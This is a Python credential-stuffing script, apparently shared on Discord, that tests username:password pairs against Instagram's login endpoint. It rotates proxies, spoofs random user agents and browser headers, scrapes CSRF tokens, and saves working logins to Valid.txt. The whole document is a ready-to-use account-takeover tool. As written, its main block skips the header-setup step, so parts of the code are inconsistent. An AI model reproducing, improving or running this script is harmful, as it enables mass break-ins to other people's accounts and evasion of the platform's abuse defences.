'''
Developed by ! Aran#9999
Redistrubuted by ! Kenny#9999, Jillo#0318
'''

# Imports
import requests
import random
import threading
import sys
import os
from colorama import Fore, init
from fake_useragent import UserAgent
from datetime import datetime

init()

class Checker:
    def __init__(self, account, proxy) -> None:
        self.username, self.password = account.split(':')
        self.proxy = proxy
        self.session = requests.Session()
        self.user_agent = UserAgent().random

    def create_headers(self) -> None:
        self.session.proxies = self.proxy

        if 'Macintosh' in self.user_agent:
            self.os = 'Macintosh'
        elif 'Windows' in self.user_agent:
            self.os = 'Windows'
        elif 'Linux' in self.user_agent:
            self.os = 'Linux'
        else:
            self.os = 'undefined'

        self.session.headers = {
            'authority': 'www.instagram.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-CA,en;q=0.9',
            'dnt': '1',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': self.os,
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': self.user_agent
        }

        request_data = self.session.get('https://www.instagram.com/', timeout=30)
        self.trip_id = request_data.headers['x-fb-trip-id']
        get_cookies = request_data.headers['set-cookie']
        self.csrf = get_cookies.split('csrftoken=')[1].split(';')[0]
        self.mid = get_cookies.split('mid=')[1].split(';')[0]
        self.ig_did = get_cookies.split('ig_did=')[1].split(';')[0]
        self.ig_nrcb = get_cookies.split('ig_nrcb=')[1].split(';')[0] 

        self.session.cookies['csrftoken'] = self.csrf
        self.session.cookies['mid'] = self.mid
        self.session.cookies['ig_did'] = self.ig_did
        self.session.cookies['ig_nrcb'] = self.ig_nrcb
        self.session.cookies['locale'] = 'en'

        self.cookie = f'csrftoken={self.csrf}; mid={self.mid}; ig_did={self.ig_did}; ig_nrcb={self.ig_nrcb}'
        self.session.headers.update({'cookie': self.cookie})
        self.session.headers.update({'x-csrftoken': self.csrf})

        self.ASBD = self.session.get('https://www.instagram.com/static/bundles/es6/ConsumerLibCommons.js/19420d3b80dd.js').text.split("ASBD_ID='")[1].split("'}")[0]
        self.APP_ID = self.session.get('https://www.instagram.com/static/bundles/es6/ConsumerLibCommons.js/19420d3b80dd.js').text.split("instagramWebDesktopFBAppId='")[1].split("',")[0]
        self.rollout_hash = request_data.text.split('rollout_hash":"')[1].split('"')[0]

        self.session.headers.update({
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/accounts/emailsignup/',
            'x-asbd-id': self.ASBD,
            'x-csrftoken': self.csrf,
            'x-ig-app-id': self.APP_ID,
            'x-ig-www-claim': '0',
            'x-instagram-ajax': self.rollout_hash,
            'x-requested-with': 'XMLHttpRequest'
        })

    def checker(self):
        check = self.session.post('https://www.instagram.com/accounts/login/ajax/', data={
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{datetime.now().timestamp()}:{self.password}',
            'username': self.username,
            'queryParams': {},
            'optIntoOneTap': False,
            'stopDeletionNonce': None,
            'trustedDeviceRecords': {},
        })

        if check.json()['authenticated'] == False:
            return False
        elif check.json()['authenticated'] == True:
            return True
        else:
            return check.json()

    def __main__(self):
        self.create_headers()
        check_acc = self.checker()
        if check_acc == True:
            sys.stdout.write(f'{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}]{Fore.WHITE} {self.username}:{self.password}\n')
            with open('Valid.txt','a') as valid_accs:
                valid_accs.write(f'{self.username}:{self.password}\n')
        elif check_acc == False:
            sys.stdout.write(f'{Fore.RED}[{Fore.WHITE}-{Fore.RED}]{Fore.WHITE} {self.username}:{self.password}\n')
        else:
            print(check_acc)

if __name__ == '__main__':
    os.system('cls' if os.name=='nt' else 'clear')
    
    proxies = open('Proxies.txt','r').read().splitlines()
    accounts = open('Accounts.txt','r').read().splitlines()

    if proxies == []:
        proxies = [None]

    for account in accounts:
        threading.Thread(target=Checker(account, random.choice(proxies)).checker).start()